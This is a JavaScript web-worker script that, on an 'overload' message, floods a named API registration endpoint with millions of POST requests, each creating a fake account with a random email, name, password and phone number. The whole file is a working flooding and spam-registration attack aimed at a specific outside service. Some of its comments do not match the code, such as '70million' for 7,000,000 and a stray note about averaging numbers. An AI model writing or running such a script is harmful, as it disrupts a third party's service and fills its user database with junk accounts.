var url =
  "ABCDEFGHIJKLMNQRTUVWXYZabcdefghijklmnopqrstuvwxyz";
var phone = "0123456789";

function randomize(size, type = url, radix = 48) {
  size = size || 21;
  var id = "";
  while (0 < size--) {
    id += type[(Math.random() * radix) | 0];
  }
  return id;
}

//const for loop
const number = 7000000; //70million, do not try this in production

//@todo - generate randon usernames and emails with alphanumeric ids
function dummymizeData() {
  const range = Math.floor(Math.random() * 8) + 4;
  const data = {
    email: `${randomize(8)}@gmail.com`,
    first_name: randomize(range),
    last_name: randomize(range),
    password: randomize(30),
    phone: `080${randomize(8, phone, 7)}`,
    username: randomize(range)
  };
  return data;
}

function beginOverload() {
  let count = 0
   while (count < number) {
  for (let i = 0; i < number; i++) {
    console.log(count);
    fetch("https://api.masterclasschioma.com/v1/user/add", {
      method: "POST",
      cache: "no-cache",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(dummymizeData())
    })
      .then(response => {
        let v = response.json();
        v.then(e => console.log(e));
      })
      .catch(e => console.error(e));
      count++;
  }
    return "done";
}
}

self.addEventListener(
  "message",
  function(e) {
    var data = e.data;
    switch (data.cmd) {
      case "overload":
        var result = beginOverload(data); // Some function that calculates the average from the numeric array.
        self.postMessage(result);
        break;
      default:
        self.postMessage("Unknown command");
    }
  },
  false
);
